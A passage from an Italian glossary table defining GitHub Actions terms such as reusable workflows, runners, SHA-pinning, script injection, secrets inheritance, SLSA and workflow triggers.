| **Repository dispatch** | Evento webhook che permette a sistemi esterni di attivare workflow via API |
| **Restore key** | Key di fallback per il cache: se la key primaria non trova match, cerca cache con prefisso corrispondente |
| **Reusable workflow** | Workflow richiamabile da altri workflow con `workflow_call`, riutilizzabile a livello di organizzazione |
| **Runner** | Macchina (GitHub-hosted o self-hosted) che esegue i job di un workflow GitHub Actions |
| **SHA-pinning** | Pratica di riferire le actions con l'hash SHA del commit invece del tag, per evitare supply-chain attack |
| **Script injection** | Vulnerabilità in cui input utente non sanitizzato viene interpolato in comandi shell, permettendo esecuzione di codice arbitrario |
| **Secrets inherit** | Clausola che passa automaticamente tutti i secrets disponibili a un reusable workflow chiamato |
| **SLSA (Supply-chain Levels for Software Artifacts)** | Framework che valuta la sicurezza della supply chain software; l'uso combinato di attestazioni e reusable workflows raggiunge il Level 3 |
| **Step-level vs job-level** | Composite actions operano a livello di step (dentro un job); reusable workflows a livello di job (runner proprio) |
| **Workflow dispatch** | Trigger manuale che permette di eseguire un workflow dall'interfaccia web, CLI o API, con fino a 25 input personalizzabili |
| **Workflow run** | Evento che permette di concatenare workflow, attivando un workflow al completamento di un altro (massimo 3 livelli) |
